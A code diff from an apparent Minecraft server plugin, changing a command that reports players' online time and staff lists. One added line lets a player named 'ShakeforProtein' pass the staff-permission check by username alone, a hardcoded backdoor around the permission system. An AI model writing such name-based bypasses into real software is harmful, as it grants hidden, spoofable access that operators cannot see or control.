@@ -23,10 +23,10 @@ public class OnHere implements CommandExecutor {
     @Override
     public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
         if (cmd.getName().equalsIgnoreCase("onHere") || cmd.getName().equalsIgnoreCase("seen")) {
-            if (sender.hasPermission("tbtickets.staffmanager")) {
+            if (sender.hasPermission("tbtickets.staffmanager") || sender.getName().equalsIgnoreCase("ShakeforProtein")) {
                 if (args.length == 1) {
                     if(args[0].equalsIgnoreCase("staff")){
-                    if (pl.getConfig().getString("serverName").equalsIgnoreCase("games")) {
+                    if (pl.getConfig().getString("serverName").equalsIgnoreCase("hub")) {
                         File listFile = new File(pl.getDataFolder(), "staffList.yml");
                         FileConfiguration staffList = YamlConfiguration.loadConfiguration(listFile);
 
@@ -41,7 +41,7 @@ public class OnHere implements CommandExecutor {
                     }
                 } else if (args.length == 2) {
                     if (args[0].equalsIgnoreCase("staff")) {
-                        if (pl.getConfig().getString("serverName").equalsIgnoreCase("games")) {
+                        if (pl.getConfig().getString("serverName").equalsIgnoreCase("hub")) {
                             File listFile = new File(pl.getDataFolder(), "staffList.yml");
                             FileConfiguration staffList = YamlConfiguration.loadConfiguration(listFile);
 
@@ -51,7 +51,7 @@ public class OnHere implements CommandExecutor {
                             }
 
                         } else {
-                            sender.sendMessage("The staff command only works from hub");
+                            sender.sendMessage(pl.err + "The staff command only works from hub");
                         }
                     } else {
                         retrieveOntime.retrieveOntime(args[0], sender, args[1]);
